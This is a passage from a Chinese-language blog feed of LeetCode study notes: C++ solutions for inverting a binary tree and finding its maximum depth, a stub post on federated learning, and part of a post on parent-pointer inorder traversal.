&lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt;left != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            q.<span class="built_in">push</span>(current-&gt;left);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(current-&gt;right != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            q.<span class="built_in">push</span>(current-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">TreeNode *<span class="title">BT::invertTree</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">    TreeNode *tmp = <span class="number">0</span>;</span><br><span class="line">    TreeNode *current = root;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">invertTree</span>(current-&gt;left);</span><br><span class="line">    <span class="built_in">invertTree</span>(current-&gt;right);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    tmp = current-&gt;left;</span><br><span class="line">    current-&gt;left = current-&gt;right;</span><br><span class="line">    current-&gt;right = tmp;</span><br><span class="line">    tmp =<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    TreeNode *nodeA =  <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">4</span>);</span><br><span class="line">    TreeNode *nodeB =  <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">2</span>);</span><br><span class="line">    TreeNode *nodeC =  <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">7</span>);</span><br><span class="line">    TreeNode *nodeD =  <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">1</span>);</span><br><span class="line">    TreeNode *nodeE =  <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">3</span>);</span><br><span class="line">    TreeNode *nodeF =  <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">6</span>);</span><br><span class="line">    TreeNode *nodeG =  <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">9</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TreeNode *nodeA =  new TreeNode(2);</span></span><br><span class="line">    <span class="comment">// TreeNode *nodeB =  new TreeNode(3);</span></span><br><span class="line">    <span class="comment">// TreeNode *nodeC =  new TreeNode(1);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    nodeA-&gt;left = nodeB;</span><br><span class="line">    nodeA-&gt;right = nodeC;</span><br><span class="line">    nodeB-&gt;left = nodeD;</span><br><span class="line">    nodeB-&gt;right = nodeE;</span><br><span class="line">    nodeC-&gt;left = nodeF;</span><br><span class="line">    nodeC-&gt;right = nodeG;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// nodeA-&gt;right = nodeB;</span></span><br><span class="line">    <span class="comment">// nodeB-&gt;right = nodeC;</span></span><br><span class="line">    <span class="comment">// nodeB-&gt;left = NULL;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function">BT <span class="title">T</span><span class="params">(nodeA)</span></span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Level Order: &quot;</span> &lt;&lt; endl;</span><br><span class="line">    T.<span class="built_in">levelOrder</span>();</span><br><span class="line"></span><br><span class="line">    T.<span class="built_in">invertTree</span>(T.root);</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;\nAfter Inverstion:&quot;</span> &lt;&lt; endl;</span><br><span class="line">    T.<span class="built_in">levelOrder</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>$O(N)$, 每個節點都會被訪問一次，其中 n 是樹中節點的數量。</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>在一般情況下，對於一棵平衡二元樹，空間複雜度是 $O(log n)$，因為樹的高度 h 大約為 $log n$。但對於完全不平衡的樹，空間複雜度會退化到 $O(n)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二元樹的最大深度 | Easy | LeetCode#104. Maximum Depth of Binary Tree</title>
      <link href="/posts/4cd60718.html"/>
      <url>/posts/4cd60718.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/104/question.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 題目給定一個Binary Tree 的 <code>Root</code>，要求這棵二元樹的最大深度</li></ul><div class="note info flat"><p>最大深度即 root 到樹葉的最遠距離</p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始的想法只有停留在 Traversal 本身，所以寫了 Inorder, Preorder, Postorder 甚至是 Level-order，都還是沒有太多想法…</p><p>這次是看了提示後才寫出來，並且了解到我自己對Recursive 的不熟練</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> leftdepth = <span class="built_in">maxDepth</span>(root-&gt;left);</span><br><span class="line">        <span class="type">int</span> rightdepth = <span class="built_in">maxDepth</span>(root-&gt;right);</span><br><span class="line">        <span class="comment">//cout &lt;&lt; root-&gt;val &lt;&lt; &quot; &quot;;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(leftdepth, rightdepth) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><p><img src="/img/LeetCode/104/algo1.png"><br><img src="/img/LeetCode/104/algo2.png"></p><p>首先程式碼對於 root pointer 存取到NULL，則回傳0 (也就是已經走到Leaf了)，之後遞迴求每個節點的各自子節點的最大深度值，當走到 leaf 的時候，由於左右子節點都為 NULL，因此對於 leaf node 來說它的 <code>leftdepth</code> 以及 <code>rightdepth</code> 都是0，因此回傳 1 (0+1)，代表從leaf 開始往回算深度，目前深度為1。</p><p>之後就會沿著之前的 functional call chain 一路返回到 Root，<strong>並且在返回過程比較左右子樹的深度哪個比較大，因此一旦跑完程式，回傳結果必定會是最大深度。</strong></p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/104/result.jpeg"></p><h3 id="完整本地測試程式碼"><a href="#完整本地測試程式碼" class="headerlink" title="完整本地測試程式碼"></a>完整本地測試程式碼</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        TreeNode *leftchild, *rightchild;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">TreeNode</span>():<span class="built_in">val</span>(<span class="number">0</span>),<span class="built_in">leftchild</span>(<span class="number">0</span>),<span class="built_in">rightchild</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">TreeNode</span>(<span class="type">int</span> x):<span class="built_in">val</span>(x),<span class="built_in">leftchild</span>(<span class="number">0</span>),<span class="built_in">rightchild</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">TreeNode</span>(<span class="type">int</span> x, TreeNode *left, TreeNode *right):<span class="built_in">val</span>(x),<span class="built_in">leftchild</span>(left),<span class="built_in">rightchild</span>(right)&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">BinaryTree</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        TreeNode *root;</span><br><span class="line">        <span class="comment">//Constructor</span></span><br><span class="line">        <span class="built_in">BinaryTree</span>():<span class="built_in">root</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">BinaryTree</span>(TreeNode * node):<span class="built_in">root</span>(node)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//member function</span></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Levelorder</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function"><span class="type">int</span> <span class="title">maxDepth</span><span class="params">(TreeNode * root)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BinaryTree::maxDepth</span><span class="params">(TreeNode * current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(current == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> leftdepth = <span class="built_in">maxDepth</span>(current-&gt;leftchild);</span><br><span class="line">    <span class="type">int</span> rightdepth = <span class="built_in">maxDepth</span>(current-&gt;rightchild);</span><br><span class="line">    <span class="comment">//cout &lt;&lt; root-&gt;val &lt;&lt; &quot; &quot;;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>(leftdepth, rightdepth) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="comment">// Instanitate  all tree nodes</span></span><br><span class="line">    TreeNode *nodeA = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">1</span>);</span><br><span class="line">    TreeNode *nodeB = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">2</span>);</span><br><span class="line">    TreeNode *nodeC = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">3</span>);</span><br><span class="line">    TreeNode *nodeD = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">4</span>);</span><br><span class="line">    TreeNode *nodeE = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    nodeA-&gt;leftchild = nodeB;</span><br><span class="line">    nodeB -&gt; leftchild = nodeD;</span><br><span class="line">    nodeA-&gt;rightchild = nodeC;</span><br><span class="line">    nodeC-&gt;rightchild = nodeE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Define root node</span></span><br><span class="line">    <span class="function">BinaryTree <span class="title">T</span><span class="params">(nodeA)</span></span>;</span><br><span class="line"></span><br><span class="line">   cout &lt;&lt; <span class="string">&quot;max depth: &quot;</span> &lt;&lt;  T.<span class="built_in">maxDepth</span>(T.root) &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>時間複雜度會是 $O(n)$，因為它需要遍歷樹中的每個節點一次</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>在一般情況下（例如平衡二元樹），遞迴方法的空間複雜度是 $O(log(n))$ (也就是跟平衡樹的高度一樣，高度為 log(n)，其中 n 是節點數目)，但如果是 skewed tree，則樹高與節點數量一樣，也就是 n ，因此最壞情況下的空間複雜度會是 $O(n)$</p><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>這次讓我體會到了遞迴的力量，我應該會回去複習 Recursive 的各種用法</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Tree </tag>
            
            <tag> Binary Tree </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>從並行計算到聯邦式學習 | 學習筆記</title>
      <link href="/posts/3c833967.html"/>
      <url>/posts/3c833967.html</url>
      
        <content type="html"><![CDATA[<h1 id="甚麼是並行計算"><a href="#甚麼是並行計算" class="headerlink" title="甚麼是並行計算?"></a>甚麼是並行計算?</h1><p>現在的深度神經網路模型具有大量的參數，模型大也意味著計算量變大</p><blockquote><p>Big Model + Big Data -&gt; Huge computation cost !</p></blockquote><p>單一GPU進行一年的計算量，可以透過20 個 GPU 一次進行計算來實現，來減少花費的時間成本</p><h1 id="Linear-Predictor"><a href="#Linear-Predictor" class="headerlink" title="Linear Predictor"></a>Linear Predictor</h1><p>未完待續</p><h1 id="甚麼是聯邦式學習"><a href="#甚麼是聯邦式學習" class="headerlink" title="甚麼是聯邦式學習?"></a>甚麼是聯邦式學習?</h1><div class="note info flat"><p>最好先具備並行計算和分部式機器學習的基礎。可以參考下面這系列影片:<a href="https://www.youtube.com/watch?v=gVcnOe6_c6Q&t=124s">https://www.youtube.com/watch?v=gVcnOe6_c6Q&amp;t=124s</a></p></div><p>未完待續</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>[1] <a href="https://www.youtube.com/watch?v=STxtRucv_zo&t=6s">https://www.youtube.com/watch?v=STxtRucv_zo&amp;t=6s</a></p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Federated Learning </tag>
            
            <tag> Machine Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷題必會知識 | 樹 (Tree) | 進階實作篇 | LeetCode 筆記</title>
      <link href="/posts/tree_for_leetcode_2.html"/>
      <url>/posts/tree_for_leetcode_2.html</url>
      
        <content type="html"><![CDATA[<h1 id="In-Order-Traversal-by-Parent-Field"><a href="#In-Order-Traversal-by-Parent-Field" class="headerlink" title="In-Order Traversal by Parent Field"></a>In-Order Traversal by Parent Field</h1><p>在<a href="https://leozzmc.github.io/posts/tree_for_leetcode.html">前一篇介紹 Tree 的文章</a> 中應該有發現，我們在實作 Binary Tree Node 的時候有宣告一個 <code>TreeNode *parent</code> 指標，但卻沒有使用。</p><p>我們在實踐 Inorder Traversal 也可以透過 Parent Field來去進行，若要善用 <code>*parent</code> 進行 Traversal 需要提及兩個重要函式:</p><ul><li><code>InorderSuccessor()</code> : 以 inorder 順序尋找 (LVR) 進行 Traversal 的 <strong>下一個 node</strong></li><li><code>InorderPredecessor()</code>: 以 inorder 順序尋找 (LVR) 進行 Traversal 的 <strong>前一個 node</strong></li></ul><p><img src="/img/LeetCode/tree/new_inorder.png"></p><blockquote><p>這裡提到的概念會與之後的 BST(Binary Search Tree) 有關聯</p></blockquote><p>在實作這兩個函式來實踐 Inorder Traversal 之間還有幾項前置作業必須先完成:</p><ul><li>在 <code>main()</code> 中將不同節點的 <code>*parent</code> 之間串接起來</li><li>在 <code>class BinartTree</code> 中定義六個成員函式</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Link the parent pointers</span></span><br><span class="line">    nodeB -&gt; parent = nodeA;</span><br><span class="line">    nodeC -&gt; parent = nodeA;</span><br><span class="line">    nodeD -&gt; parent = nodeB;</span><br><span class="line">    nodeE -&gt; parent = nodeB;</span><br><span class="line">    nodeG -&gt; parent = nodeE;</span><br><span class="line">    nodeH -&gt; parent = nodeE;</span><br><span class="line">    nodeF -&gt; parent = nodeC;</span><br><span class="line">    nodeI -&gt; parent = nodeF;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="comment">// the root is the starting node ot the tree</span></span><br><span class="line">        TreeNode *root; </span><br><span class="line">        <span class="built_in">BinaryTree</span>(): <span class="built_in">root</span>(<span class="number">0</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">BinaryTree</span>(TreeNode *node): <span class="built_in">root</span>(node)&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Preorder</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Inorder</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Postorder</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Levelorder</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// add 6 new member functions</span></span><br><span class="line">        <span class="function">TreeNode * <span class="title">Leftmost</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function">TreeNode * <span class="title">Rightmost</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function">TreeNode * <span class="title">InorderSuccessor</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function">TreeNode * <span class="title">InorderPredecessor</span><span class="params">(TreeNode *current)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Inorder_by_parent</span><span class="params">(TreeNode *root)</span></span>;</span><br><span class="line">        <span class="function"><span class="type">void</span> <span class="title">Inorder_Reverse</span><span class="params">(TreeNode *root)</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="Leftmost-and-Successor"><a href="#Leftmost-and-Successor" class="headerlink" title="Leftmost and Successor"></a>Leftmost and Successor</h2><p>前置作業完成後接著就是要個別定義成員函式，首先是 <code>Letfmost()</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode * <span class="title">BinaryTree::Leftmost</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(current-&gt;leftchild != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        current = current-&gt;leftchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這邊很直觀，就是取得以currentNode為基準，最左的child節點(也就是該 subTree 第一個要訪問的節點)，<strong>如果輸入是root Node，則輸出會是整個 Inorder Traversal 中的起始節點</strong></p><p>接著就是 <code>Successor</code> ，用來尋找 currentNode 的下一個節點。但這樣會有兩種狀況:</p><p><strong>第一種: 若 CurrentNode 的 right child 不是 NULL，則 CurrentNode下一個順序的node 會是 “Current-&gt;rightchild 為 root” 的 subTree 當中最左邊的node</strong> 聽起來很繞口，舉例來說，下圖中的 nodeB 為 CurrentNode 的時候，此時它的 right child 不為 null，因此它的 Successor 會是以 right child 為 root 的 subTree 中最左邊的節點，也就是 nodeG</p><p><strong>第二種: 如果 CurrentNode 沒有 right child，則 CurrentNode 的下一個node 會是 “以 left child 身分找到的 ancestor”</strong> ， 舉例來說，下圖中的 nodeH 並沒有 right child，因此它的 Successor 必定是它的 Ancestor，但必須得是尚未 Visiting 過的 ancestor 節點，由於順序是 inorder (LVR)，因此必須是以 Left child 身分找到得 ancestor 才會是下一個節點。因此nodeH 會找到 nodeA 為 Successor。</p><p><img src="/img/LeetCode/tree/Inorder_by_parent.png"></p><div class="note info flat"><p><strong>特別提醒，在實作第二種狀況的時候，在特定的 Tree 會發生問題，例如只有 left subTree 的 skewed tree，整棵樹都沒有 right subTree，這時就必須回傳 NULL，代表 root 沒有 successor</strong></p></div><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode * <span class="title">BinaryTree::InorderSuccessor</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(current-&gt;rightchild != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Leftmost</span>(current-&gt;rightchild);</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode *Successor = current-&gt;parent;</span><br><span class="line">    <span class="comment">// if current node is succesor&#x27;s right child, then keep moving back to it&#x27;s parent node.</span></span><br><span class="line">    <span class="keyword">while</span>( Successor != <span class="literal">NULL</span> &amp;&amp; current == Successor-&gt;rightchild)&#123;</span><br><span class="line">        current = Successor;</span><br><span class="line">        Successor = Successor-&gt;parent;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Suceessor == NULL or the current node is Successor&#x27;s left child</span></span><br><span class="line">    <span class="keyword">return</span> Successor;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有了 <code>Leftmost</code> 跟   <code>InorderSuccessor</code> 其實就可以進行 Inorder Traversal 了，整體會合併實現在 <code>Inorder_by_parent</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BinaryTree::Inorder_by_parent</span><span class="params">(TreeNode *root)</span></span>&#123;</span><br><span class="line">  TreeNode *current = <span class="keyword">new</span> TreeNode;</span><br><span class="line">  current = <span class="built_in">Leftmost</span>(root);</span><br><span class="line">  <span class="keyword">while</span>(current != <span class="literal">NULL</span> )&#123;</span><br><span class="line">    cout &lt;&lt; current-&gt;str &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    current= <span class="built_in">InorderSuccessor</span>(current);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此時在 <code>main()</code> 呼叫 <code>T.Inorder_by_parent(T.root)</code> 即可輸出 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D B G E H A F I C </span><br></pre></td></tr></table></figure><h2 id="Rightmost-and-Predecessor"><a href="#Rightmost-and-Predecessor" class="headerlink" title="Rightmost and Predecessor"></a>Rightmost and Predecessor</h2><p><code>Rightmost</code> 以及 <code>Predecessor</code> 和 <code>Leftmost</code> 跟 <code>Successor</code> 的概念相近，幾乎就是 left right 互換而已:</p><p><strong>Rightmost 要做的事就是以 CurrentNode 為 root 找到 subtree 中最右邊的節點</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TreeNode * <span class="title">BinaryTree::Rightmost</span><span class="params">(TreeNode *current)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(current-&gt;rightchild != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        current = current-&gt;rightchild;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> current;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而 Predecessor 代表 CurrentNode 的前一個節點，其位置跟 Successor 一樣有兩種可能:</p><p><strong>第一種: 若 CurrentNode 的 leftchild 不為 null，則 CurrentNode 的上一個節點會是以 CurrentNode-&gt;leftchild 為 root 的 subTree 中最右邊的 node</strong>。 舉例來說，下圖中 nodeC的 Predecessor 就會是以 nodeF (L) 為 root 之 subTree 的最右邊節點，也就是 nodeI。</p><p><strong>第二種: 若 CurrentNode 沒有 leftchild，則 CurrentNode 的前一個 node 會是 “以right child 身分找到的 ancestor”</strong> 。舉例來說，下圖中 nodeF 並沒有 leftchild，因此按照 Inorder 順序 (LVR)，它的上一個節點必定為它的 ancestor，但會是已經拜訪過的 ancestor，因此尋找到 ancestor 的身分必定會是 rightchild，引此 nodeF 以 leftchild 身分找到的 ancestor nodeC 並不是它的 Predecessor，因此繼續往上找到 nodeA，即為它的 Predecessor。</p><p><img src="/img/LeetCode/tree/Inorder_by_Parent_2.png"></p><div class="note info 